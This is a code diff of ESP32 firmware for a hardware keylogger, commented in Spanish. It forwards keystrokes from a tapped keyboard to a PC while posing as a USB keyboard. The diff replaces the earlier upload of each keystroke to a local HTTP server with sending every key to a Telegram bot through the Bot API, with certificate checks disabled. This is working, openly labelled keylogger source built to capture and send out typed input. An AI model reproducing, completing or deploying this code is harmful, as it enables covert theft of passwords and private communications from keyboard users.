@@ -1,34 +1,37 @@
+// Codigo emisor keylogger - solo envio a Telegram
 #include "USB.h"
 #include "USBHIDKeyboard.h"
 #include <WiFi.h>
 #include <HTTPClient.h>
+#include <WiFiClientSecure.h>
 #include "freertos/queue.h"
 
 // ====== Objetos principales ======
-USBHIDKeyboard Keyboard;   // Controlador HID para emular teclado
+USBHIDKeyboard Keyboard;
 
-// ====== Configuración UART ======
+// ====== Configuracion UART ======
 #define RX_PIN 18
 #define TX_PIN 17
 #define BAUD_RATE 9600
 
-// ====== Configuración WiFi ======
-const char* ssid     = "";  // Nombre de la red WiFi
-const char* password = "";  // Contraseña de la red WiFi
+// ====== Configuracion WiFi ======
+const char* ssid     = ""; // Nombre del WiFi
+const char* password = ""; // Clave del WiFi
 
-// ====== Configuración del servidor ======
-const char* serverURL = "http://192.168.1.43:5555/key";  // IP y puerto del servidor receptor
+// ====== Configuracion de Telegram ======
+String botToken = ""; // Token del bot de telegram
+String chatID   = ""; // ID del chat
 
-// ====== Comandos especiales (no ASCII) ======
+// ====== Comandos especiales ======
 #define CMD_ESC        0x1B
 #define CMD_TAB        0x09
 #define CMD_CAPS       0x14
 #define CMD_BACKSPACE  0x08
 #define CMD_ENTER      0x0A
 #define CMD_GUI        0x90
-#define CMD_ALTGR      0x92   // AltGr (Right Alt)
+#define CMD_ALTGR      0x92
 
-// ====== Tabla de equivalencias de comandos ======
+// ====== Tabla de equivalencias ======
 typedef struct {
   uint8_t command;
   uint8_t keycode;
@@ -44,27 +47,66 @@ CommandMap commandMap[] = {
 
 const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);
 
-// ====== Cola para envío de teclas al servidor ======
+// ====== Cola para envio de teclas ======
+#define KEYBUF_LEN 128
+#define QUEUE_SIZE 32
 QueueHandle_t keyQueue;
 
 // =====================================================================
-// ====================== TAREA DE ENVÍO AL SERVIDOR ===================
+// ============ URL ENCODE =============================================
 // =====================================================================
-// Esta tarea corre en segundo plano. Toma las teclas de la cola y las
-// envía al servidor HTTP de forma ordenada y no bloqueante.
-// =====================================================================
-void serverTask(void* parameter) {
-  String key;
-  for (;;) {
-    if (xQueueReceive(keyQueue, &key, portMAX_DELAY) == pdTRUE) {
-      if (WiFi.status() == WL_CONNECTED) {
-        HTTPClient http;
-        http.setTimeout(1000);  // Timeout máximo 1s
 
-        if (http.begin(serverURL)) {
-          http.addHeader("Content-Type", "application/json");
-          String json = "{\"key\":\"" + key + "\"}";
-          http.POST(json);
+String urlEncode(const char* input) {
+  String out = "";
+  for (size_t i = 0; input[i] != '\0'; ++i) {
+    uint8_t c = (uint8_t)input[i];
+    if (isalnum(c)) {
+      out += (char)c;
+    } else {
+      char tmp[4];
+      sprintf(tmp, "%%%02X", c);
+      out += tmp;
+    }
+  }
+  return out;
+}
+
+// =====================================================================
+// ============ Envio asincrono (cola) =================================
+// =====================================================================
+
+void sendLater(const String& key) {
+  char buf[KEYBUF_LEN];
+  key.toCharArray(buf, KEYBUF_LEN);
+  xQueueSend(keyQueue, buf, 0);
+}
+
+// =====================================================================
+// ============ TAREA DE ENVIO A TELEGRAM ==============================
+// =====================================================================
+
+void serverTask(void* parameter) {
+  char keyBuf[KEYBUF_LEN];
+
+  WiFiClientSecure client;
+  client.setInsecure();
+
+  HTTPClient http;
+
+  for (;;) {
+    if (xQueueReceive(keyQueue, &keyBuf, portMAX_DELAY) == pdTRUE) {
+      if (WiFi.status() == WL_CONNECTED) {
+
+        String encoded = urlEncode(keyBuf);
+
+        String url = "https://api.telegram.org/bot" + botToken +
+                     "/sendMessage?chat_id=" + chatID +
+                     "&text=" + encoded;
+
+        http.setTimeout(2000);
+
+        if (http.begin(client, url)) {
+          http.GET();
           http.end();
         }
       }
@@ -76,43 +118,42 @@ void serverTask(void* parameter) {
 // ========================== CONTROL HID ===============================
 // =====================================================================
 
-// Simula la pulsación y liberación de una tecla
 void pressAndRelease(uint8_t key) {
   Keyboard.press(key);
   Keyboard.release(key);
 }
 
-// Envía la tecla a la cola para que el servidor la procese luego
-void sendLater(const String& key) {
-  xQueueSend(keyQueue, &key, 0);  // No bloquea, descarta si la cola está llena
-}
-
-// Verifica si el byte recibido es un comando especial
 bool isSpecialCommand(uint8_t cmd) {
   if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;
+
   for (int i = 0; i < commandCount; i++) {
     if (cmd == commandMap[i].command) return true;
   }
   return false;
 }
 
-// Ejecuta acciones según el comando especial recibido
 void handleSpecialCommand(uint8_t cmd) {
   for (int i = 0; i < commandCount; i++) {
     if (cmd == commandMap[i].command) {
       pressAndRelease(commandMap[i].keycode);
-      sendLater(String(commandMap[i].keycode)); 
+
+      switch (cmd) {
+        case CMD_ESC: sendLater("ESC"); break;
+        case CMD_TAB: sendLater("TAB"); break;
+        case CMD_CAPS: sendLater("CAPS_LOCK"); break;
+        case CMD_BACKSPACE: sendLater("BACKSPACE"); break;
+        case CMD_ENTER: sendLater("ENTER"); break;
+        default: sendLater(String(commandMap[i].keycode)); break;
+      }
       return;
     }
   }
 
-  // Tecla GUI (Windows)
   if (cmd == CMD_GUI) {
     pressAndRelease(KEY_LEFT_GUI);
     sendLater("GUI");
   }
 
-  // Tecla AltGr
   if (cmd == CMD_ALTGR) {
     pressAndRelease(KEY_RIGHT_ALT);
     sendLater("ALTGR");
@@ -122,19 +163,17 @@ void handleSpecialCommand(uint8_t cmd) {
 // =====================================================================
 // ============================ SETUP ==================================
 // =====================================================================
+
 void setup() {
-  // Inicializar UART secundaria
+  Serial.begin(115200);
   Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
-  
-  // Personalizar nombre del dispositivo USB
+
   USB.productName("Teclado Keylogger");
   USB.begin();
 
-  // Inicializar teclado HID
   Keyboard.begin();
   delay(500);
 
-  // Intentar conexión WiFi (20 intentos)
   WiFi.begin(ssid, password);
   int retries = 0;
   while (WiFi.status() != WL_CONNECTED && retries < 20) {
@@ -142,28 +181,26 @@ void setup() {
     retries++;
   }
 
-  // Crear cola y tarea para el envío de teclas al servidor
-  keyQueue = xQueueCreate(32, sizeof(String));
-  xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
+  keyQueue = xQueueCreate(QUEUE_SIZE, KEYBUF_LEN);
+  if (keyQueue != NULL) {
+    xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
+  }
 }
 
 // =====================================================================
 // ============================= LOOP ==================================
 // =====================================================================
-// Lee bytes del UART, interpreta si son comandos especiales o teclas
-// normales, y los envía al PC (como teclado) y al servidor (por HTTP).
-// =====================================================================
+
 void loop() {
   if (Serial1.available()) {
     uint8_t c = Serial1.read();
 
-    // Comando especial (ESC, TAB, GUI, etc.)
     if (isSpecialCommand(c)) {
       handleSpecialCommand(c);
-    } 
-    // Caracter ASCII imprimible
+    }
+
     else if (c >= 0x20 && c <= 0x7E) {
-      // Caso especial: '@' en layout español-latino
+
       if (c == '@') {
         Keyboard.press(KEY_RIGHT_ALT);
         Keyboard.press('q');
@@ -177,6 +214,5 @@ void loop() {
     }
   }
 
-  // Pequeño retardo para ceder tiempo al planificador de FreeRTOS
   delay(1);
 }
